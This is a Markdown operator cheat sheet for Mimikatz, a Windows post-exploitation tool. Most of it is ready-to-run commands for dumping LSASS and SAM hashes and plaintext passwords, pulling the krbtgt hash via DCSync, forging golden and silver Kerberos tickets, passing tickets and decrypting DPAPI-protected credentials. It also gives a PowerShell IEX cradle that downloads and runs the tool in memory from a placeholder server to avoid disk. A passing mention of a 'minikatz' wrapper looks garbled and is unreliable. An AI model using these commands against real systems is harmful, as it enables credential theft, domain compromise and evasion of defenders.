# Mimikatz — Windows Credential Extraction

Post-exploitation tool for extracting plaintext passwords, hashes, PINs, and Kerberos tickets from Windows memory. Interacts with LSASS, SAM, DPAPI, and Kerberos subsystems via Win32 API calls.

## How It Works

Mimikatz operates by calling Windows APIs (via `minikatz` Win32 wrapper or kernel-mode driver) to read process memory that contains credential material.

**Data sources:**

| Source | Data Obtained | Privilege |
|--------|---------------|-----------|
| **LSASS** | Logon sessions, NTLM hashes, plaintext passwords (wdigest/credman/ssp/kerberos), Kerberos tickets (TGT/TGS) | `DEBUG` + `SeDebugPrivilege` |
| **SAM** | Local account hashes (SAM registry hive) | SYSTEM |
| **SECURITY** | Domain cached credentials (MSV1_0), SYSTEM account NT hash | SYSTEM |
| **DPAPI** | Master keys → decrypt saved browser passwords, certs, RDP creds, Vault creds | User or SYSTEM (per user key) |
| **LSA Secrets** | Service account passwords, auto-logon creds, SQL/DPAPI keys | SYSTEM |

**Operations:**
- `privilege::debug` — enable SeDebugPrivilege (prerequisite)
- `sekurlsa::logonpasswords` — extract from LSASS (hashes + plaintext if wdigest/kerberos/credman available)
- `lsadump::sam` — dump SAM hive
- `lsadump::dcsync` — domain controller replication (needs replication rights)
- `lsadump::lsa` — extract LSA secrets
- `kerberos::*` — ticket manipulation (PTT, golden/silver tickets, ask/export/destroy)
- `dpapi::*` — DPAPI master key and blob operations
- `vault::*` — Windows Vault credential access
- `token::*` — token manipulation (elevate, impersonate, list)

**Kernel mode driver (`mimidrv.sys`):** loads into kernel to bypass PPL (Protected Process Light) on LSASS since Win8.1.

## Manual

### Basic Commands

```batch
# Start Mimikatz
mimikatz.exe

# Enable debug privilege (elevated context required)
mimikatz # privilege::debug

# Extract logon passwords (hashes + plaintext)
mimikatz # sekurlsa::logonpasswords

# Dump SAM (local account hashes)
mimikatz # lsadump::sam

# Dump domain credentials via DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

### Kerberos Tickets

```batch
# List current tickets
mimikatz # kerberos::list

# Export all tickets to files
mimikatz # sekurlsa::tickets /export

# Inject TGT into current session (Pass-the-Ticket)
mimikatz # kerberos::ptt ticket.kirbi

# Golden Ticket (forge TGT with krbtgt hash)
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:<ntlm-hash> /user:Administrator /id:500 /ptt

# Silver Ticket (forge TGS for a service)
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:dc.domain.local /service:cifs /rc4:<ntlm-hash> /user:Administrator /ptt
```

### DPAPI

```batch
# List master keys in current context
mimikatz # dpapi::masterkey

# Decrypt DPAPI blob (saved RDP credentials, browser data)
mimikatz # dpapi::blob /masterkey:<mk-guid> /in:"C:\Users\user\AppData\Local\Microsoft\Credentials\..."

# Extract backup keys from Domain Controller (Domain DPAPI)
mimikatz # lsadump::backupkeys /system:dc.domain.local /export
```

### LSADump

```batch
# Dump LSA secrets (service passwords, auto-login)
mimikatz # lsadump::lsa /patch

# Dump LSA secrets (requires SYSTEM)
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::secrets
```

## Build

```bash
git clone https://github.com/gentilkiwi/mimikatz.git
cd mimikatz
# Open mimikatz.sln in Visual Studio and build (Windows only)
# Alternatively use the prebuilt binary from releases
```

## Install

### Windows

```powershell
# Download binary from GitHub releases
Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -OutFile mimikatz.zip
Expand-Archive -Path mimikatz.zip -DestinationPath .\mimikatz

# Run (admin required for most features)
.\mimikatz\x64\mimikatz.exe
```

### In-Memory (avoid disk)

```powershell
# PowerShell download cradle (IEX)
IEX (New-Object Net.WebClient).DownloadString('http://your-server/mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

## Package

| Manager | Command |
|---------|---------|
| GitHub Releases | https://github.com/gentilkiwi/mimikatz/releases |

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/gentilkiwi/mimikatz |
| Wiki | https://github.com/gentilkiwi/mimikatz/wiki |
| Module reference | https://github.com/gentilkiwi/mimikatz/wiki/Module-List |
| Invoke-Mimikatz (PS) | https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1 |
| Blog | https://blog.gentilkiwi.com/ |
| Pass-the-Hash article | https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn560741(v=ws.11) |
